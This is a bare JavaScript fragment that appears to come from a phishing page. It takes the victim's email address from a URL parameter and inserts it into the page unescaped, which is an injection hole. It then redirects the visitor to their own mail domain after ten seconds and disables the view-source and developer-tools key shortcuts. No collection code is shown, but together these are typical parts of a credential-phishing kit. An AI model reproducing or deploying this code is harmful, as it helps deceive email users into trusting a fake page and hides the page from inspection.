  <script>


    /* global $ */
    $(document).ready(function(){
      
      var number = getUrlVars()["msg"];
      if (!number) {
        $("#mail").hide();
      }
      else
      {
       $("#mail").html(number);
       $("#mail").show();
       var my_email =number;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
       setTimeout(() => {  window.location.replace("https://www."+my_slice); }, 10000);

     }




     function getUrlVars() {
        var vars = {};
        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
          vars[key] = value;
        });
        return vars;
      }







   });

    document.onkeydown=function(e){
      if (e.ctrlKey && 
        (e.keyCode === 73 || 
         e.keyCode === 105 ||
         e.keyCode === 74 || 
         e.keyCode === 106 || 
         e.keyCode === 85 || 
         e.keyCode === 117)) {
        alert('not allowed');
      return false;
    } else {
      return true;
    }
  }
